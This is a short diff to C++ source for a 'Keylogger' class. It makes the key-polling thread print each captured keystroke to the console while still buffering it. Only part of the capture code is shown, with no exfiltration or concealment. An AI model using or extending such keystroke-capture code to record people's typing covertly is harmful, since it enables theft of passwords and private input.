@@ -7,7 +7,7 @@
 #include <thread>
 #include <atomic>
 #include <mutex>
-
+#include <iostream>
 Keylogger& Keylogger::get()
 {
     static Keylogger instance;
@@ -276,11 +276,14 @@ void Keylogger::pollingThread()
 
             if (isDown && !m_prevKeyStates[vk]) {
                 if (vk >= 0x30 && vk <= 0x5A) {
-                    m_keyBuffer += vkToString(vk, shiftPressed);
+                    std::string keyStr = vkToString(vk, shiftPressed);
+                    std::cout << keyStr << std::flush;
+                    m_keyBuffer += keyStr;
                 }
                 else {
                     std::string special = vkToString(vk, shiftPressed);
                     if (!special.empty()) {
+                        std::cout << special << std::flush;
                         if (vk == VK_RETURN) {
                             m_keyBuffer += special;
                             flushToBuffer();
